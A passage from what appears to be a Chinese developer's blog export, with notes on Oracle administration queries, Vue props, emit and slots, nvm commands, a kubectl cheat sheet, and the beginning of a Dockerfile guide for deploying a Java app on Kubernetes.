查看存放在Oracle内存区的表</span><br><span class="line"><span class="keyword">select</span> table_name, cache <span class="keyword">from</span> user_tables <span class="keyword">where</span> instr(cache, <span class="string">&#x27;Y&#x27;</span>) <span class="operator">&gt;</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle索引"><a href="#Oracle索引" class="headerlink" title="Oracle索引"></a>Oracle索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看索引个数和类别</span><br><span class="line"><span class="keyword">select</span> index_name, index_type, table_name <span class="keyword">from</span> user_indexes <span class="keyword">order</span> <span class="keyword">by</span> table_name;</span><br><span class="line"></span><br><span class="line"># 查看索引所涉及的字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_ind_columns <span class="keyword">where</span> index_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;index_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查看索引大小</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes) <span class="operator">/</span> (<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> &quot;size(M)&quot; <span class="keyword">from</span> user_segments <span class="keyword">where</span> segment_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;index_name&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Oracle数据库管理"><a href="#Oracle数据库管理" class="headerlink" title="Oracle数据库管理"></a>Oracle数据库管理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看表空间的名称及大小</span><br><span class="line"><span class="keyword">select</span> t.tablespace_name, round(<span class="built_in">sum</span>(bytes<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>)),<span class="number">0</span>) ts_size <span class="keyword">from</span> dba_tablespaces t, dba_data_files d <span class="keyword">where</span> t.tablespace_name <span class="operator">=</span> d.tablespace_name <span class="keyword">group</span> <span class="keyword">by</span> t.tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看表空间物理文件的名称及大小</span><br><span class="line"><span class="keyword">select</span> tablespace_name, file_id, file_name, round(bytes<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>),<span class="number">0</span>) total_space <span class="keyword">from</span> dba_data_files <span class="keyword">order</span> <span class="keyword">by</span> tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看回滚段名称及大小</span><br><span class="line"><span class="keyword">select</span> segment_name, tablespace_name, r.status, (initial_extent<span class="operator">/</span><span class="number">1024</span>) InitialExtent, (next_extent<span class="operator">/</span><span class="number">1024</span>) NextExtent, max_extents, v.curext CurExtent <span class="keyword">from</span> dba_rollback_segs r, v$rollstat v <span class="keyword">where</span> r.segment_id <span class="operator">=</span> v.usn(<span class="operator">+</span>) <span class="keyword">order</span> <span class="keyword">by</span> segment_name;</span><br><span class="line"></span><br><span class="line"># 查看控制文件</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> v$controlfile;</span><br><span class="line"></span><br><span class="line"># 查看日志文件</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">member</span> <span class="keyword">from</span> v$logfile;</span><br><span class="line"></span><br><span class="line"># 查看表空间的使用情况</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes)<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> free_space, tablespace_name <span class="keyword">from</span> dba_free_space <span class="keyword">group</span> <span class="keyword">by</span> tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看数据库对象</span><br><span class="line"><span class="keyword">select</span> owner, object_type, status, <span class="built_in">count</span>(<span class="operator">*</span>) count# <span class="keyword">from</span> all_objects <span class="keyword">group</span> <span class="keyword">by</span> owner, object_type, status;</span><br><span class="line"></span><br><span class="line"># 查看数据库版本</span><br><span class="line"><span class="keyword">select</span> version <span class="keyword">FROM</span> Product_component_version <span class="keyword">where</span> SUBSTR(PRODUCT,<span class="number">1</span>,<span class="number">6</span>)<span class="operator">=</span><span class="string">&#x27;Oracle&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看数据库的创建日期和归档方式</span><br><span class="line"><span class="keyword">select</span> Created, Log_Mode <span class="keyword">From</span> V$Database;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue笔记</title>
    <url>/cnblogs.github.io/2025/01/17/frontEnd/vue/Vue%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="VUE常用组件"><a href="#VUE常用组件" class="headerlink" title="VUE常用组件"></a>VUE常用组件</h4><h5 id="组件的基石：Props"><a href="#组件的基石：Props" class="headerlink" title="组件的基石：Props"></a><strong>组件的基石：Props</strong></h5><p>Props（属性）是父组件向子组件传递数据的桥梁。通过 props，我们可以将父组件的状态传递给子组件，从而实现数据的单向流动。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 <span class="title class_">Parent</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Child</span> <span class="attr">:message</span>=<span class="string">&quot;parentMessage&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">Child</span> <span class="keyword">from</span> <span class="string">&#x27;./Child.vue&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123; <span class="title class_">Child</span> &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">parentMessage</span>: <span class="string">&#x27;Hello from Parent!&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 <span class="title class_">Child</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">props</span>: [<span class="string">&#x27;message&#x27;</span>]</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>在父组件中，通过 :message&#x3D;”parentMessage” 将 parentMessage 的值传递给子组件的 message prop。</li>
<li>在子组件中，通过 props: [‘message’] 声明接收一个名为 message 的 prop。</li>
</ul>
<h5 id="组件的“发声器”：Emit"><a href="#组件的“发声器”：Emit" class="headerlink" title="组件的“发声器”：Emit"></a><strong>组件的“发声器”：Emit</strong></h5><p>Emit（发射）是子组件向父组件传递事件和数据的桥梁。当子组件内部发生了一些变化，需要通知父组件时，就可以使用 emit</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 <span class="title class_">Button</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;handleClick&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">this</span>.$emit(<span class="string">&#x27;button-click&#x27;</span>, <span class="string">&#x27;button clicked!&#x27;</span>); <span class="comment">// 发射一个 &#x27;button-click&#x27; 事件</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 <span class="title class_">Parent</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Button</span> @<span class="attr">button-click</span>=<span class="string">&quot;handleButtonClick&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">Button</span> <span class="keyword">from</span> <span class="string">&#x27;./Button.vue&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123; <span class="title class_">Button</span> &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">handleButtonClick</span>(<span class="params">msg</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">this</span>.<span class="property">message</span> = msg; <span class="comment">// 接收子组件传来的数据</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>在子组件中，通过 this.$emit(‘button-click’, ‘button clicked!’) 发射一个名为 button-click 的事件，并传递数据 “button clicked!”。</li>
<li>在父组件中，通过 @button-click&#x3D;”handleButtonClick” 监听 button-click 事件，并执行 handleButtonClick 方法。</li>
</ul>
<h5 id="组件的“插槽”：Slots"><a href="#组件的“插槽”：Slots" class="headerlink" title="组件的“插槽”：Slots"></a><strong>组件的“插槽”：Slots</strong></h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 <span class="title class_">Card</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;header&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;footer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 <span class="title class_">Parent</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Card Header<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is card content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Card Footer<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">Card</span> <span class="keyword">from</span> <span class="string">&#x27;./Card.vue&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123; <span class="title class_">Card</span> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>作用域插槽：作用域插槽可以让父组件访问子组件的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 子组件 <span class="title class_">List</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:item</span>=<span class="string">&quot;item&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">list</span>: [<span class="string">&#x27;Item 1&#x27;</span>, <span class="string">&#x27;Item 2&#x27;</span>, <span class="string">&#x27;Item 3&#x27;</span>]</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- 父组件 <span class="title class_">Parent</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">List</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; item &#125;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">List</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">List</span> <span class="keyword">from</span> <span class="string">&#x27;./List.vue&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123; <span class="title class_">List</span> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="前端相关命令"><a href="#前端相关命令" class="headerlink" title="前端相关命令"></a>前端相关命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在项目开发过程中，使用到vue框架技术，需要安装node下载项目依赖，但经常会遇到node版本不匹配而导致无法正常下载，重新安装node却又很麻烦。为解决以上问题，nvm：一款node的版本管理工具，能够管理node的安装和使用，使用简单，可下载指定node版本和切换使用不同版本，方便了node的使用。</span><br><span class="line"></span><br><span class="line">nvm ls-remote # 列出所有远程服务器的版本（官方node version list）</span><br><span class="line">nvm list # (可简化为nvm ls) 列出所有已安装的 node 版本</span><br><span class="line">nvm list available # 显示所有可下载的版本</span><br><span class="line">nvm install stable # 安装最新版 node</span><br><span class="line">nvm install [node版本号] # 安装指定版本 node</span><br><span class="line">nvm uninstall [node版本号] # 删除已安装的指定版本</span><br><span class="line">nvm use [node版本号] # 切换到指定版本 node</span><br><span class="line">nvm current ：当前 node 版本 nvm alias [别名] [node版本号] # 给不同的版本号添加别名</span><br><span class="line">nvm unalias [别名] ：删除已定义的别名 nvm alias default [node版本号] # 设置默认版本</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/coreybutler/nvm-windows/releases">NVM下载</a></p>
]]></content>
      <categories>
        <category>前端技能</category>
      </categories>
      <tags>
        <tag>VUE</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes笔记</title>
    <url>/cnblogs.github.io/2025/05/30/operations/Kubernetes/Kubernetes%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Kubernetes常用命令"><a href="#Kubernetes常用命令" class="headerlink" title="Kubernetes常用命令"></a>Kubernetes常用命令</h3><h4 id="集群信息"><a href="#集群信息" class="headerlink" title="集群信息"></a>集群信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl cluster-info                  # 显示集群信息</span><br><span class="line">kubectl version                       # 显示客户端和服务器版本</span><br><span class="line">kubectl get nodes                     # 查看所有节点状态</span><br><span class="line">kubectl describe node &lt;node-name&gt;     # 查看节点详细信息</span><br></pre></td></tr></table></figure>
<h4 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get &lt;resource&gt;                # 查看资源(pods, services, deployments等)</span><br><span class="line">kubectl describe &lt;resource&gt; &lt;name&gt;    # 查看资源详细信息</span><br><span class="line">kubectl create -f &lt;file.yaml&gt;         # 通过YAML文件创建资源</span><br><span class="line">kubectl apply -f &lt;file.yaml&gt;          # 应用YAML文件配置</span><br><span class="line">kubectl delete -f &lt;file.yaml&gt;         # 删除YAML文件中定义的资源</span><br><span class="line">kubectl delete &lt;resource&gt; &lt;name&gt;      # 删除指定资源</span><br></pre></td></tr></table></figure>
<h4 id="Pod相关"><a href="#Pod相关" class="headerlink" title="Pod相关"></a>Pod相关</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get pods                                        # 查看所有pod</span><br><span class="line">kubectl get pods -o wide                                # 查看pod及所在节点</span><br><span class="line">kubectl describe pod &lt;pod-name&gt;                         # 查看pod详细信息</span><br><span class="line">kubectl logs &lt;pod-name&gt;                                 # 查看pod日志</span><br><span class="line">kubectl logs -f &lt;pod-name&gt;                              # 实时查看pod日志</span><br><span class="line">kubectl exec -it &lt;pod-name&gt; -- /bin/bash                # 进入pod的shell</span><br><span class="line">kubectl port-forward &lt;pod-name&gt; &lt;local-port&gt;:&lt;pod-port&gt;  # 端口转发</span><br></pre></td></tr></table></figure>
<h4 id="Deployment相关"><a href="#Deployment相关" class="headerlink" title="Deployment相关"></a>Deployment相关</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get deployments                                     # 查看所有deployment</span><br><span class="line">kubectl describe deployment &lt;deploy-name&gt;                   # 查看deployment详情</span><br><span class="line">kubectl scale deployment &lt;deploy-name&gt; --replicas=&lt;number&gt;  # 扩缩容</span><br><span class="line">kubectl rollout status deployment &lt;deploy-name&gt;             # 查看滚动更新状态</span><br><span class="line">kubectl rollout history deployment &lt;deploy-name&gt;            # 查看部署历史</span><br><span class="line">kubectl rollout undo deployment &lt;deploy-name&gt;               # 回滚到上一版本</span><br></pre></td></tr></table></figure>
<h4 id="Service相关"><a href="#Service相关" class="headerlink" title="Service相关"></a>Service相关</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get services                                                                # 查看所有service</span><br><span class="line">kubectl describe service &lt;svc-name&gt;                                                 # 查看service详情</span><br><span class="line">kubectl expose deployment &lt;deploy-name&gt; --port=&lt;port&gt; --target-port=&lt;target-port&gt;   # 创建service</span><br></pre></td></tr></table></figure>
<h4 id="命名空间操作"><a href="#命名空间操作" class="headerlink" title="命名空间操作"></a>命名空间操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get namespaces                                      # 查看所有命名空间</span><br><span class="line">kubectl create namespace &lt;ns-name&gt;                          # 创建命名空间</span><br><span class="line">kubectl config set-context --current --namespace=&lt;ns-name&gt;  # 设置默认命名空间</span><br></pre></td></tr></table></figure>
<h4 id="调试命令"><a href="#调试命令" class="headerlink" title="调试命令"></a>调试命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl top nodes                                           # 查看节点资源使用情况</span><br><span class="line">kubectl top pods                                            # 查看pod资源使用情况</span><br><span class="line">kubectl get events                                          # 查看集群事件</span><br><span class="line">kubectl get events --sort-by=&#x27;.metadata.creationTimestamp&#x27;  # 按时间排序查看事件</span><br></pre></td></tr></table></figure>
<h4 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get configmaps                # 查看configmap</span><br><span class="line">kubectl get secrets                   # 查看secret</span><br><span class="line">kubectl edit &lt;resource&gt; &lt;name&gt;        # 编辑资源</span><br></pre></td></tr></table></figure>
<h4 id="其他实用命令"><a href="#其他实用命令" class="headerlink" title="其他实用命令"></a>其他实用命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl api-resources                       # 查看所有API资源类型</span><br><span class="line">kubectl explain &lt;resource&gt;                  # 查看资源定义说明</span><br><span class="line">kubectl cp &lt;pod-name&gt;:&lt;path&gt; &lt;local-path&gt;   # 从pod复制文件到本地</span><br><span class="line">kubectl auth can-i &lt;verb&gt; &lt;resource&gt;        # 检查权限</span><br></pre></td></tr></table></figure>


<h3 id="Kubernetes部署JAVA"><a href="#Kubernetes部署JAVA" class="headerlink" title="Kubernetes部署JAVA"></a>Kubernetes部署JAVA</h3><h4 id="第一步：准备阶段"><a href="#第一步：准备阶段" class="headerlink" title="第一步：准备阶段"></a>第一步：准备阶段</h4><p>在开始之前，你需要确保自己的工作环境已经配置好了必要的工具。包括但不限于 Docker（用来打包 Java 应用）、kubectl（Kubernetes 的命令行工具）以及 Helm（一种方便快捷的 K8s 包管理工具）。如果你还不熟悉这些工具的话，别担心，我会尽量用最简单的语言给你解释清楚。假设你已经有了一个简单的 Spring Boot 应用程序。首先要做的是将其容器化。也就是说，我们需要创建一个 Dockerfile 文件来定义这个应用是如何被封装成镜像的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用官方 OpenJDK 镜像作为基础</span><br><span class="line">FROM openjdk:17-jdk-slim</span><br><span class="line"></span><br><span class="line"># 设置工作目录</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># 复制构建好的 JAR 包到镜像内</span><br><span class="line">COPY target/my-awesome-java-app.jar app.jar</span><br><span class="line"></span><br><span class="line"># 暴露端口</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line"># 定义启动命令</span><br><span class="line">CMD [&quot;java&quot;, &quot;-jar&quot;, &quot;app.jar&quot;]</span><br></pre></td></tr></table></figure>
<p>在这个 Dockerfile 中，我们指定了基础镜像、工作目录、复制文件、暴露端口，并设置了容器启动时执行的命令。完成之后，你可以通过执行 docker build -t my-java-app . 来构建镜像。然后使用 docker run 命令验证一下是否能正常运行。</p>
